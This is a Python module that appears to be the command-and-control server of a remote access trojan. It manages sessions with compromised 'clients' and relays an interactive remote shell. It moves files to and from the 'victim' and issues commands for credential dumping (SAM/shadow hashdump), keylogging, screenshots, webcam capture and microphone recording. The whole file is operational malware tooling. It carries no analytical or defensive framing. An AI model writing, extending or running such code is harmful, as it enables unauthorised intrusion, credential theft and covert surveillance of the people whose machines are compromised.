import time

from .logger import logger
from .protocol import build_command
from .file_transfer import upload_file
from .file_transfer import download_file
from .terminal import set_prompt

SERVER_COMMANDS = {
    "help",
    "list",
    "interact",
    "exit"
}

SESSION_LOCAL_COMMANDS = {
    "help",
    "back",
    "disconnect"
}

REMOTE_COMMANDS = {
    "help",
    "download",
    "upload",
    "shell",
    "ipconfig",
    "screenshot",
    "search",
    "hashdump",
    "keylogger",
    "webcam_snapshot",
    "webcam_stream",
    "record_audio"
}



#-------------- COMMANDS IMPLEMENTATION -------------#
def handle_command(command: str, client_manager):
    parts = command.strip().split()
    if not parts:
        return None

    cmd = parts[0].lower()

    if cmd == "help":
        show_help()
        return None

    elif cmd == "list":
        list_clients(client_manager)
        return None

    elif cmd == "interact":
        if len(parts) < 2:
            logger.warning("Usage: interact <client_id>")
            return None
        start_session(parts[1], client_manager)
        return None

    elif cmd == "exit":
        logger.info("Exiting server...")
        return "exit"

    else:
        logger.error(f"Unknown command: {cmd}")
        return None

# ------ Client Listing ------ #
def list_clients(client_manager):
    clients = client_manager.get_all()

    if not clients:
        logger.info("No connected clients.")
        return

    logger.info("Connected clients:")
    logger.info("-" * 40)

    for c in clients:
        info = c.info()
        logger.info(f"ID: {info['id']} | IP: {info['ip']} | Status: {info['status']}")

    logger.info("-" * 40)



def start_session(client_id: str, client_manager):
    client = client_manager.get(client_id)

    if not client or client.status == "disconnected":
        logger.warning("Client unavailable")
        return

    logger.info(f"Session started with {client.id}")

    while True:
        try:
            prompt = f"session({client.id}) > "
            set_prompt(prompt)
            cmd = input(prompt)

            if not cmd:
                continue

            parts = cmd.split()
            base = parts[0].lower()

            # ---------- LOCAL COMMANDS ---------- #
            if base == "back":
                logger.info("Leaving session...")
                break

            if base == "help":
                session_help()
                continue

            if base == "disconnect":
                client.send(build_command("disconnect"))
                client.close()
                client_manager.remove(client.id)
                logger.warning("Client disconnected")
                break

            # ---------- SHELL ---------- #
            if base == "shell":
                if client.is_shell():
                    logger.warning("Already in shell mode")
                    continue
                start_shell(client)

            # ---------- FILE TRANSFER ---------- #
            if base == "upload":
                handle_upload(cmd, client)
                continue

            if base == "download":
                handle_download(cmd, client)
                continue

            # ---------- REMOTE ---------- #
            if base not in REMOTE_COMMANDS:
                logger.warning("Unknown command")
                continue

            packet = build_command(base, parts[1:])
            client.send(packet)

            # --- READ BUFFER INSTEAD OF RECEIVE --- #
            flush_client_buffer(client)


        except KeyboardInterrupt:
            logger.warning("Use 'back' to exit session")



def shell_prompt(client_id):
    return f"session({client_id})$ "


def start_shell(client):
    logger.info("Entering interactive shell (type 'exit' to leave)")

    client.set_mode("shell")

    client.send({
        "type": "shell_start"
    })

    while True:
        try:

            prompt = f"shell({client.id}) > "
            cmd = input(prompt)

            if cmd.strip().lower() in ("exit", "back"):
                client.set_mode("normal")
                logger.info("Leaving shell...")
                break

            client.send({
                "type": "shell_command",
                "cmd": cmd
            })

            # -- STREAM OUTPUT FROM BUFFER -- #
            time.sleep(0.1) # small wait for data to arrive
            flush_shell_buffer(client)

        except KeyboardInterrupt:
            logger.warning("Use 'exit' to leave shell")


def print_client_info(client):
    info = client.info()

    logger.info("\nClient info:")
    logger.info(f"ID      : {info['id']}")
    logger.info(f"IP      : {info['ip']}")
    logger.info(f"Status  : {info['status']}")


# ------ FILE TRANSFER -------- #
def handle_upload(command, client):
    parts = command.split()
    if len(parts) < 3:
        logger.warning("Usage: upload <local> <remote>")
        return

    upload_file(client, parts[1], parts[2])


def handle_download(command, client):
    parts = command.split()
    if len(parts) < 3:
        logger.warning("Usage: download <remote> <local>")
        return

    download_file(client, parts[1], parts[2])


# -------- BUFFER HANDLING -------- #
def flush_client_buffer(client):
    outputs = client.pop_buffer()

    for t, data in outputs:
        if t == "response":
            logger.info(data)
        elif t == "shell_output":
            pass # already handled by client_manager
        else:
            logger.info(str(data))


def flush_shell_buffer(client):
    outputs = client.pop_buffer()

    for t, data in outputs:
        if t == "response":
            logger.info(data)


#----------- HELPERS --------------#
def show_help():
    logger.info("""
Server commands:
    list
    interact <id>
    help
    exit
""")


def session_help():
    logger.info("""
Available commands:

help               Show this help
back               Exit session
disconnect         Disconnect client

download           Get file from victim
upload             Send file to victim
shell              Open remote shell
ipconfig           Network configuration
screenshot         Capture screen
search             Find file on system
hashdump           Dump credentials (SAM/shadow)
keylogger          Start keylogging
webcam_snapshot    Take webcam photo
webcam_stream      Live webcam feed
record_audio       Record microphone
""")

